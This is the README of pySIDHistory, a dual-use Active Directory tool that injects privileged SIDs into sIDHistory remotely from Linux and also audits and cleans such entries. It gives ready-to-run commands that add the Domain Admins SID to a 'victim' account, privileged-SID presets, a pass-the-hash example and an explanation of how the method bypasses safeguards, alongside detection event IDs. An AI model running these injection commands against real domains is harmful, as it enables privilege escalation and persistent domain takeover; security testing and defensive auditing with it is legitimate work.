# pySIDHistory

Remote SID History injection & auditing from Linux — the first tool to implement `IDL_DRSAddSidHistory` (MS-DRSR opnum 20) in Python.

> *"There is currently no way to exploit this technique purely from a distant UNIX-like machine"* — [The Hacker Recipes](https://www.thehacker.recipes/ad/persistence/sid-history)

## What It Does

Injects arbitrary SIDs into Active Directory's `sIDHistory` attribute **remotely from Linux**, without patching DC memory (no mimikatz) and without offline `ntds.dit` access (no DSInternals). Also provides domain-wide auditing and cleanup for blue teams.

**MITRE ATT&CK**: [T1134.005 — SID-History Injection](https://attack.mitre.org/techniques/T1134/005/)

## Features

### Red Team — Injection

| Feature | Flag | Description |
|---------|------|-------------|
| Preset injection | `--preset domain-admins` | Injects well-known SIDs (DA, EA, Schema Admins...) |
| Direct SID injection | `--sid S-1-5-21-...-512` | Inject any arbitrary SID |
| User-to-user injection | `--source-user Administrator` | Copies a user's SID into target's sIDHistory |
| Cross-forest injection | `--source-domain OTHER.LOCAL` | Inject SIDs from trusted domains |
| DRSUAPI RPC method | `--method drsuapi` | Uses `DRSAddSidHistory` (opnum 20) — bypasses SAM layer |
| LDAP method | `--method ldap` | Direct LDAP modify (works post-patch or for removal) |
| Bulk injection | `--targets-file users.txt --sid ...` | Inject into multiple targets from file |
| Copy history | `--copy-from admin` | Copies all sIDHistory entries between objects |
| Dry run | `--dry-run` | Preview changes without modifying AD |

**10 built-in presets**: `administrator`, `administrators`, `domain-admins`, `domain-controllers`, `enterprise-admins`, `enterprise-key-admins`, `group-policy-creators`, `key-admins`, `krbtgt`, `schema-admins`

### Blue Team — Audit & Cleanup

| Feature | Flag | Description |
|---------|------|-------------|
| Domain-wide audit | `--audit` | Scans all objects for sIDHistory, risk assessment |
| Query single object | `--query victim` | Show sIDHistory with SID resolution |
| SID lookup | `--lookup admin` | Resolve sAMAccountName to SID |
| Enumerate trusts | `--enum-trusts` | List domain trusts + SID filtering status |
| Clear history | `--target X --clear` | Remove all sIDHistory entries |
| Clean same-domain | `--target X --clean-same-domain` | Remove attack SIDs, preserve migration SIDs |
| Remove specific SID | `--target X --sid ... --remove` | Remove a single SID entry |
| Bulk clear | `--targets-file X --bulk-clear` | Mass cleanup |
| JSON output | `-o json --output-file report.json` | Structured output for SIEM ingestion |
| CSV output | `-o csv --output-file report.csv` | For spreadsheets and reporting |

### Authentication — 5 Methods

| Method | Flags | Protocol |
|--------|-------|----------|
| NTLM (password) | `-u admin -p Pass123` | ldap3 NTLM |
| Pass-the-Hash | `-u admin --ntlm-hash <LM:NT>` | impacket + ldap3 |
| Kerberos | `--kerberos --ccache ticket.ccache` | ldap3 SASL/GSSAPI |
| Certificate (PTC) | `--certificate --cert-file X --key-file Y` | LDAPS + SASL EXTERNAL |
| SIMPLE bind | `--simple -u admin -p Pass123 --use-ssl` | ldap3 SIMPLE |

## Installation

```bash
git clone https://github.com/felixbillieres/pySIDHistory.git
cd pySIDHistory
pip install -r requirements.txt
```

**Requirements**: Python 3.7+, `ldap3`, `impacket`

## Usage

```bash
# Inject Domain Admins SID via preset
python3 sidhistory.py -d CORP.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 \
    --target victim --preset domain-admins

# Inject specific SID
python3 sidhistory.py -d CORP.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 \
    --target victim --sid S-1-5-21-xxx-512

# Cross-forest injection via DRSUAPI
python3 sidhistory.py -d DST.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 \
    --target victim --source-user admin --source-domain SRC.LOCAL --method drsuapi

# Full domain audit
python3 sidhistory.py -d CORP.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 --audit

# Audit with JSON output
python3 sidhistory.py -d CORP.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 \
    --audit -o json --output-file audit.json

# Query a user's sIDHistory
python3 sidhistory.py -d CORP.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 --query victim

# Enumerate domain trusts and SID filtering status
python3 sidhistory.py -d CORP.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 --enum-trusts

# Clean same-domain SIDs (blue team remediation)
python3 sidhistory.py -d CORP.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 \
    --target victim --clean-same-domain

# Pass-the-Hash
python3 sidhistory.py -d CORP.LOCAL -u admin --ntlm-hash aad3b435b51404ee:31d6cfe0d16ae931 \
    --dc-ip 10.0.0.1 --audit

# Kerberos
python3 sidhistory.py -d CORP.LOCAL --kerberos --ccache admin.ccache \
    --dc-ip 10.0.0.1 --dc-hostname dc01.corp.local --audit
```

Run `python3 sidhistory.py -h` for full usage.

## Architecture

```
sidhistory.py              CLI entry point & argument handling
  └── core/
      ├── attack.py        Orchestrator (wires everything together)
      ├── auth.py          Authentication (5 methods, ldap3 + impacket)
      ├── ldap_operations.py  LDAP queries & modifications
      ├── drsuapi.py       DRSAddSidHistory RPC (opnum 20, first Python impl)
      ├── scanner.py       Domain-wide auditing & risk assessment
      ├── sid_utils.py     SID binary conversion, presets, well-known SIDs
      └── output.py        Console/JSON/CSV formatting
```

## How It Works

**The problem**: Active Directory's SAM layer blocks LDAP writes to `sIDHistory` regardless of ACLs. Mimikatz bypasses this by patching `ntdsa.dll` in memory — but that requires SYSTEM on the DC.

**Our approach**: We call `IDL_DRSAddSidHistory` (opnum 20) on the DRSUAPI RPC interface — the same call that Microsoft's ADMT uses for legitimate domain migrations. This is the first Python implementation of this RPC operation.

```
Client (Linux)                          Domain Controller
  │                                         │
  │── EPM (135) ──────────────────────────►│  Resolve DRSUAPI endpoint
  │── DCE/RPC BIND (DRSUAPI UUID) ───────►│  With PKT_PRIVACY encryption
  │── DRSBind (opnum 0) ─────────────────►│  Signal DRS_EXT_ADD_SID_HISTORY
  │── DRSAddSidHistory (opnum 20) ───────►│  Inject SID into sIDHistory
  │◄── DRS_MSG_ADDSIDREPLY_V1 ───────────│  Win32 error code (0 = success)
```

See `docs/IMPLEMENTATION.md` for the full technical deep-dive.

## Detection

| Event ID | Description |
|----------|-------------|
| **4765** | SID History added to an account |
| **4766** | SID History add attempt failed |
| **4738** | User account changed (any attribute) |

Monitor for 4765/4766 — these are specific to SID History and should be extremely rare in production.

## Documentation

- [`docs/IMPLEMENTATION.md`](docs/IMPLEMENTATION.md) — Technical deep-dive: NDR serialization, protocol internals, troubleshooting
- [`docs/ARTICLE.md`](docs/ARTICLE.md) — Full writeup: how and why this tool was built
- [`docs/REFERENCES.md`](docs/REFERENCES.md) — All references and prior art

## References

- [MS-DRSR: IDL_DRSAddSidHistory (Opnum 20)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/376230a5-d806-4ae5-970a-f6243ee193c8)
- [MITRE ATT&CK T1134.005](https://attack.mitre.org/techniques/T1134/005/)
- [The Hacker Recipes: SID History](https://www.thehacker.recipes/ad/persistence/sid-history)
- [impacket](https://github.com/fortra/impacket)

## Author

**Felix Billieres (Elliot Belt)**

## Legal

**For authorized security testing only.** Unauthorized access to computer systems is illegal. Use at your own risk on systems you have explicit permission to test.
